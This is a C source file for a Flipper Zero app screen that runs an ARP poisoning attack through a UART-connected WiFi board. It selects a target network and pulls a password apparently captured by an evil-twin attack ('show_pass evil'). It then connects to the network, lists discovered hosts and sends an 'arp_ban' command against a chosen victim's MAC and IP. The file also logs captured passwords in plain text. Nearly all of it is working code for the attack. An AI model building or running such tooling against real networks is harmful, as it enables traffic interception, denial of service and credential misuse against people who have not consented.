/**
 * ARP Poisoning Attack Screen
 *
 * Connects to a WiFi network, discovers hosts, and performs ARP poisoning.
 * Flow:
 *   1. select_networks <index>
 *   2. show_pass evil  -> check if password is known
 *   3. (optional) TextInput for password
 *   4. wifi_connect <SSID> <password>
 *   5. list_hosts -> show discovered hosts table
 *   6. User selects host -> arp_ban <MAC> <IP>
 *   7. Back from poisoning -> stop, back to host list
 *
 * Memory lifecycle:
 * - screen_arp_poisoning_create(): Allocates ArpPoisoningData, thread, view, TextInput
 * - arp_poisoning_cleanup_internal(): Frees everything on screen pop
 */

#include "screen_attacks.h"
#include "uart_comm.h"
#include "screen.h"
#include <gui/modules/text_input.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <furi.h>

#define TAG "ARPPoison"

// ============================================================================
// Data Structures
// ============================================================================

#define ARP_PASSWORD_MAX    64
#define ARP_TEXT_INPUT_ID   997
#define ARP_MAX_HOSTS       32

typedef struct {
    char ip[16];
    char mac[18];
} HostEntry;

typedef struct {
    WiFiApp* app;
    volatile bool attack_finished;
    uint8_t state;
    // 0 = checking password (thread)
    // 1 = waiting for password input (TextInput)
    // 2 = connecting to WiFi
    // 3 = scanning hosts
    // 4 = host list display
    // 5 = ARP poisoning active

    // Network info
    char ssid[33];
    char password[ARP_PASSWORD_MAX + 1];
    uint32_t net_index; // 1-based

    // Host discovery
    HostEntry hosts[ARP_MAX_HOSTS];
    uint8_t host_count;
    uint8_t selected_host;
    bool hosts_loaded;

    // Status
    char status_text[64];
    bool connect_failed;

    // Flipper resources
    FuriThread* thread;
    TextInput* text_input;
    bool text_input_added;
    bool password_entered;
    View* main_view;
} ArpPoisoningData;

typedef struct {
    ArpPoisoningData* data;
} ArpPoisoningModel;

// ============================================================================
// Cleanup
// ============================================================================

static void arp_poisoning_cleanup_impl(View* view, void* data) {
    UNUSED(view);
    ArpPoisoningData* d = (ArpPoisoningData*)data;
    if(!d) return;

    FURI_LOG_I(TAG, "Cleanup starting");

    d->attack_finished = true;
    if(d->thread) {
        furi_thread_join(d->thread);
        furi_thread_free(d->thread);
    }

    if(d->text_input) {
        if(d->text_input_added) {
            view_dispatcher_remove_view(d->app->view_dispatcher, ARP_TEXT_INPUT_ID);
        }
        text_input_free(d->text_input);
    }

    free(d);
    FURI_LOG_I(TAG, "Cleanup complete");
}

void arp_poisoning_cleanup_internal(View* view, void* data) {
    arp_poisoning_cleanup_impl(view, data);
}

// ============================================================================
// TextInput callback
// ============================================================================

static void arp_password_callback(void* context) {
    ArpPoisoningData* data = (ArpPoisoningData*)context;
    if(!data || !data->app) return;

    FURI_LOG_I(TAG, "Password entered: %s", data->password);
    data->password_entered = true;
    data->state = 2; // Move to connecting

    uint32_t main_view_id = screen_get_current_view_id();
    view_dispatcher_switch_to_view(data->app->view_dispatcher, main_view_id);
}

static void arp_show_text_input(ArpPoisoningData* data) {
    if(!data || !data->text_input) return;

    if(!data->text_input_added) {
        View* ti_view = text_input_get_view(data->text_input);
        view_dispatcher_add_view(data->app->view_dispatcher, ARP_TEXT_INPUT_ID, ti_view);
        data->text_input_added = true;
    }

    view_dispatcher_switch_to_view(data->app->view_dispatcher, ARP_TEXT_INPUT_ID);
}

// ============================================================================
// Drawing
// ============================================================================

static void arp_poisoning_draw(Canvas* canvas, void* model) {
    ArpPoisoningModel* m = (ArpPoisoningModel*)model;
    if(!m || !m->data) return;
    ArpPoisoningData* data = m->data;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(data->state == 0) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "Checking password...", 32);

    } else if(data->state == 1) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "Enter password", 32);
        if(!data->text_input_added) {
            arp_show_text_input(data);
        }

    } else if(data->state == 2) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        char line[48];
        char ssid_trunc[20];
        strncpy(ssid_trunc, data->ssid, sizeof(ssid_trunc) - 1);
        ssid_trunc[sizeof(ssid_trunc) - 1] = '\0';
        snprintf(line, sizeof(line), "Connecting to %s...", ssid_trunc);
        screen_draw_centered_text(canvas, line, 32);
        if(data->connect_failed) {
            screen_draw_centered_text(canvas, "Connection FAILED", 46);
            screen_draw_centered_text(canvas, "Press Back", 58);
        }

    } else if(data->state == 3) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "Scanning hosts...", 32);
        if(data->status_text[0]) {
            screen_draw_centered_text(canvas, data->status_text, 46);
        }

    } else if(data->state == 4) {
        // Host list table
        screen_draw_title(canvas, "Hosts");
        canvas_set_font(canvas, FontSecondary);

        if(data->host_count == 0) {
            screen_draw_centered_text(canvas, "No hosts found", 32);
        } else {
            uint8_t y = 22;
            uint8_t max_visible = 5;
            uint8_t start = 0;
            if(data->selected_host >= max_visible) {
                start = data->selected_host - max_visible + 1;
            }

            for(uint8_t i = start; i < data->host_count && (i - start) < max_visible; i++) {
                uint8_t display_y = y + ((i - start) * 9);
                char line[42];
                snprintf(line, sizeof(line), "%-15s %s", data->hosts[i].ip, data->hosts[i].mac);

                if(i == data->selected_host) {
                    canvas_draw_box(canvas, 0, display_y - 7, 128, 9);
                    canvas_set_color(canvas, ColorWhite);
                    canvas_draw_str(canvas, 1, display_y, line);
                    canvas_set_color(canvas, ColorBlack);
                } else {
                    canvas_draw_str(canvas, 1, display_y, line);
                }
            }
        }

    } else if(data->state == 5) {
        // ARP Poisoning active
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "ARP Poisoning Active", 28);

        char line[48];
        snprintf(line, sizeof(line), "IP:  %s", data->hosts[data->selected_host].ip);
        canvas_draw_str(canvas, 2, 42, line);
        snprintf(line, sizeof(line), "MAC: %s", data->hosts[data->selected_host].mac);
        canvas_draw_str(canvas, 2, 54, line);
    }
}

// ============================================================================
// Input Handling
// ============================================================================

static bool arp_poisoning_input(InputEvent* event, void* context) {
    View* view = (View*)context;
    if(!view) return false;

    ArpPoisoningModel* m = view_get_model(view);
    if(!m || !m->data) {
        view_commit_model(view, false);
        return false;
    }
    ArpPoisoningData* data = m->data;

    if(event->type != InputTypeShort && event->type != InputTypeRepeat) {
        view_commit_model(view, false);
        return false;
    }

    if(data->state == 0 || data->state == 1) {
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop(data->app);
            return true;
        }
        if(data->state == 1 && event->key == InputKeyOk) {
            arp_show_text_input(data);
            view_commit_model(view, false);
            return true;
        }

    } else if(data->state == 2 || data->state == 3) {
        // Connecting / scanning - only back works
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }

    } else if(data->state == 4) {
        // Host list
        if(event->key == InputKeyUp) {
            if(data->selected_host > 0) data->selected_host--;
        } else if(event->key == InputKeyDown) {
            if(data->selected_host + 1 < data->host_count) data->selected_host++;
        } else if(event->key == InputKeyOk) {
            if(data->host_count > 0) {
                // Start ARP poisoning on selected host
                data->state = 5;
                char cmd[64];
                snprintf(cmd, sizeof(cmd), "arp_ban %s %s",
                    data->hosts[data->selected_host].mac,
                    data->hosts[data->selected_host].ip);
                FURI_LOG_I(TAG, "Sending: %s", cmd);
                uart_send_command(data->app, cmd);
            }
        } else if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }

    } else if(data->state == 5) {
        // ARP Poisoning active popup
        if(event->key == InputKeyBack) {
            uart_send_command(data->app, "stop");
            data->state = 4; // Back to host list
        }
    }

    view_commit_model(view, true);
    return true;
}

// ============================================================================
// Password discovery helper
// ============================================================================

static bool arp_check_password(ArpPoisoningData* data) {
    WiFiApp* app = data->app;

    uart_clear_buffer(app);
    uart_send_command(app, "show_pass evil");
    furi_delay_ms(200);

    uint32_t start = furi_get_tick();
    uint32_t last_rx = start;

    while((furi_get_tick() - last_rx) < 1000 &&
          (furi_get_tick() - start) < 5000 &&
          !data->attack_finished) {
        const char* line = uart_read_line(app, 300);
        if(line) {
            last_rx = furi_get_tick();
            FURI_LOG_I(TAG, "show_pass: %s", line);

            // Parse "SSID", "password"
            const char* p = line;
            while(*p == ' ' || *p == '\t') p++;
            if(*p != '"') continue;
            p++;
            const char* ssid_start = p;
            while(*p && *p != '"') p++;
            if(*p != '"') continue;
            size_t ssid_len = p - ssid_start;
            p++;

            while(*p == ',' || *p == ' ' || *p == '\t') p++;

            if(*p != '"') continue;
            p++;
            const char* pass_start = p;
            while(*p && *p != '"') p++;
            if(*p != '"') continue;
            size_t pass_len = p - pass_start;

            if(ssid_len == strlen(data->ssid) &&
               strncmp(ssid_start, data->ssid, ssid_len) == 0) {
                if(pass_len < sizeof(data->password)) {
                    strncpy(data->password, pass_start, pass_len);
                    data->password[pass_len] = '\0';
                    FURI_LOG_I(TAG, "Password found: %s", data->password);
                    return true;
                }
            }
        }
    }
    return false;
}

// ============================================================================
// Attack Thread
// ============================================================================

static int32_t arp_poisoning_thread(void* context) {
    ArpPoisoningData* data = (ArpPoisoningData*)context;
    WiFiApp* app = data->app;

    FURI_LOG_I(TAG, "Thread started for SSID: %s (index %lu)", data->ssid, (unsigned long)data->net_index);

    // Step 1: select_networks
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "select_networks %lu", (unsigned long)data->net_index);
    uart_send_command(app, cmd);
    furi_delay_ms(500);
    uart_clear_buffer(app);

    if(data->attack_finished) return 0;

    // Step 2: Check if password is known
    data->state = 0;
    bool found = arp_check_password(data);

    if(data->attack_finished) return 0;

    if(!found) {
        data->state = 1;
        FURI_LOG_I(TAG, "Password unknown, requesting user input");

        while(!data->password_entered && !data->attack_finished) {
            furi_delay_ms(100);
        }
        if(data->attack_finished) return 0;
    } else {
        data->state = 2;
    }

    // Step 3: Connect to WiFi
    data->state = 2;
    snprintf(cmd, sizeof(cmd), "wifi_connect %s %s", data->ssid, data->password);
    FURI_LOG_I(TAG, "Sending: %s", cmd);
    uart_clear_buffer(app);
    uart_send_command(app, cmd);

    bool connected = false;
    uint32_t start = furi_get_tick();
    while((furi_get_tick() - start) < 15000 && !data->attack_finished) {
        const char* line = uart_read_line(app, 500);
        if(line) {
            FURI_LOG_I(TAG, "wifi_connect: %s", line);
            strncpy(data->status_text, line, sizeof(data->status_text) - 1);

            if(strstr(line, "SUCCESS")) {
                connected = true;
                break;
            }
            if(strstr(line, "FAIL") || strstr(line, "Error") || strstr(line, "error")) {
                data->connect_failed = true;
                FURI_LOG_E(TAG, "Connection failed");
                break;
            }
        }
    }

    if(data->attack_finished) return 0;

    if(!connected) {
        data->connect_failed = true;
        FURI_LOG_E(TAG, "Connection timed out or failed");
        // Stay in state 2 showing error, user presses Back
        while(!data->attack_finished) {
            furi_delay_ms(100);
        }
        return 0;
    }

    // Step 4: Scan hosts
    data->state = 3;
    snprintf(data->status_text, sizeof(data->status_text), "Sending ARP requests...");
    FURI_LOG_I(TAG, "Scanning hosts");
    furi_delay_ms(200);
    uart_clear_buffer(app);
    uart_send_command(app, "list_hosts");

    bool in_host_section = false;
    start = furi_get_tick();
    uint32_t last_rx = start;

    while((furi_get_tick() - last_rx) < 3000 &&
          (furi_get_tick() - start) < 20000 &&
          !data->attack_finished) {
        const char* line = uart_read_line(app, 500);
        if(line) {
            last_rx = furi_get_tick();
            FURI_LOG_I(TAG, "list_hosts: %s", line);

            if(strstr(line, "=== Discovered Hosts ===")) {
                in_host_section = true;
                continue;
            }

            if(in_host_section && data->host_count < ARP_MAX_HOSTS) {
                // Parse "  IP  ->  MAC"
                char ip[16] = {0};
                char mac[18] = {0};
                const char* arrow = strstr(line, "->");
                if(arrow) {
                    // Extract IP (before ->)
                    const char* p = line;
                    while(*p == ' ') p++;
                    size_t ip_len = 0;
                    while(p < arrow && *p != ' ' && ip_len < sizeof(ip) - 1) {
                        ip[ip_len++] = *p++;
                    }
                    ip[ip_len] = '\0';

                    // Extract MAC (after ->)
                    p = arrow + 2;
                    while(*p == ' ') p++;
                    size_t mac_len = 0;
                    while(*p && *p != ' ' && *p != '\n' && *p != '\r' && mac_len < sizeof(mac) - 1) {
                        mac[mac_len++] = *p++;
                    }
                    mac[mac_len] = '\0';

                    if(ip[0] && mac[0]) {
                        strncpy(data->hosts[data->host_count].ip, ip, sizeof(data->hosts[0].ip) - 1);
                        strncpy(data->hosts[data->host_count].mac, mac, sizeof(data->hosts[0].mac) - 1);
                        data->host_count++;

                        snprintf(data->status_text, sizeof(data->status_text),
                            "Found %u hosts", data->host_count);
                    }
                }
            }
        }
    }

    data->hosts_loaded = true;
    data->state = 4;
    FURI_LOG_I(TAG, "Found %u hosts", data->host_count);

    // Wait while user interacts with host list or ARP poisoning is active
    while(!data->attack_finished) {
        // If ARP poisoning is active (state 5), read and log UART output
        if(data->state == 5) {
            const char* line = uart_read_line(app, 100);
            if(line) {
                FURI_LOG_I(TAG, "arp_ban output: %s", line);
            }
        } else {
            furi_delay_ms(100);
        }
    }

    FURI_LOG_I(TAG, "Thread finished");
    return 0;
}

// ============================================================================
// Screen Creation
// ============================================================================

View* screen_arp_poisoning_create(WiFiApp* app, void** out_data) {
    FURI_LOG_I(TAG, "Creating ARP Poisoning screen");

    if(!app || app->selected_count != 1) {
        FURI_LOG_E(TAG, "Exactly 1 network must be selected");
        return NULL;
    }

    ArpPoisoningData* data = (ArpPoisoningData*)malloc(sizeof(ArpPoisoningData));
    if(!data) return NULL;

    memset(data, 0, sizeof(ArpPoisoningData));
    data->app = app;
    data->attack_finished = false;
    data->state = 0;
    data->net_index = app->selected_networks[0]; // 1-based
    data->host_count = 0;
    data->selected_host = 0;
    data->hosts_loaded = false;
    data->password_entered = false;
    data->text_input_added = false;
    data->connect_failed = false;

    // Copy SSID from scan results
    uint32_t idx0 = data->net_index - 1;
    if(idx0 < app->scan_result_count && app->scan_results) {
        strncpy(data->ssid, app->scan_results[idx0].ssid, sizeof(data->ssid) - 1);
        data->ssid[sizeof(data->ssid) - 1] = '\0';
    } else {
        strncpy(data->ssid, "Unknown", sizeof(data->ssid) - 1);
    }

    // Create main view
    View* view = view_alloc();
    if(!view) {
        free(data);
        return NULL;
    }
    data->main_view = view;

    view_allocate_model(view, ViewModelTypeLocking, sizeof(ArpPoisoningModel));
    ArpPoisoningModel* m = view_get_model(view);
    m->data = data;
    view_commit_model(view, true);

    view_set_draw_callback(view, arp_poisoning_draw);
    view_set_input_callback(view, arp_poisoning_input);
    view_set_context(view, view);

    // Create TextInput for password entry
    data->text_input = text_input_alloc();
    if(data->text_input) {
        text_input_set_header_text(data->text_input, "Enter Password:");
        text_input_set_result_callback(
            data->text_input,
            arp_password_callback,
            data,
            data->password,
            ARP_PASSWORD_MAX,
            true);
        FURI_LOG_I(TAG, "TextInput created");
    }

    // Start thread
    data->thread = furi_thread_alloc();
    furi_thread_set_name(data->thread, "ARPPoison");
    furi_thread_set_stack_size(data->thread, 2048);
    furi_thread_set_callback(data->thread, arp_poisoning_thread);
    furi_thread_set_context(data->thread, data);
    furi_thread_start(data->thread);

    if(out_data) *out_data = data;

    FURI_LOG_I(TAG, "ARP Poisoning screen created");
    return view;
}
